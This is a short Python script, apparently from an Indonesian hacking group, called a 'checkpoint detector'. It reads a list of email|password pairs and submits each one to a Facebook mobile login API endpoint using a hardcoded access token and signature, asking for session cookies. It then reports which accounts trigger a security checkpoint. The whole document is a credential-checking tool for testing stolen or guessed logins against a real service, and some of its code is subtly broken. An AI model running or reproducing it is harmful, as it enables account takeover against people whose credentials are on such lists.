# _*_ coding=UTF-8 _*_
""" CODDED BY BL4CK DR460N"""
"""MAU NGAPAIN TONG? Mau Ngerecode?
Ok lah gpp ngrecode jg asal cantumin nama w bngst"""
import os,sys,time,json
try:
	import requests
except Exception as E:
	print ("ERROR: "+str(E))

banner = """\033[37m
======================================
         CHECKPOINT DETECTOR
           BY BL4CK DR460N
======================================
       Sparator: \033[32memail\033[37m|\033[32mpassword\
"""
def main():
	print (banner)
	print
	list = raw_input("\033[37m[?] ACCOUNT LIST: \033[32m")
	try:
		total = open(list).readlines()
		print ("\033[37m[\033[32m√\033[37m]\033[32m List Found ")
		print ("\033[37m[\033[33m+\033[37m] \033[33mTotal ACCOUNT : \033[33m"+str(len(total)))
	except IOError:
		print ("\033[37m[\033[31m×\033[37m]\033[31m List Not Found ")
		sys.exit()
	else:
		try:
			gas(list)
		except KeyboardInterrupt:
			print ("\033[31m[!] Key Interrupt")
			sys.exit()

class gas(list):
	def __init__(self,list):
		akun = open(list).read().splitlines()
		for acc in akun:
			p=acc.split("|")
			self.check(p[0],p[-1])
	def check(self,email,pw):
		data={"user":email,"pw":pw}
#		url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+data['user']+"&locale=en_US&password="+data['pw']+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		r = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+str(data['user'])+"&locale=en_US&password="+str(data['pw'])+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		j = json.loads(r.text)
		if "www.facebook.com" in j["error_msg"]:
			print ("\033[33mCHECKPOINT DETECTED: \033[32m{}|{} ").format(email,pw)
		else:
			print ("\033[37mNO DETECTED: \033[31m{}|{}").format(email,pw)
if __name__ == '__main__':
	main()
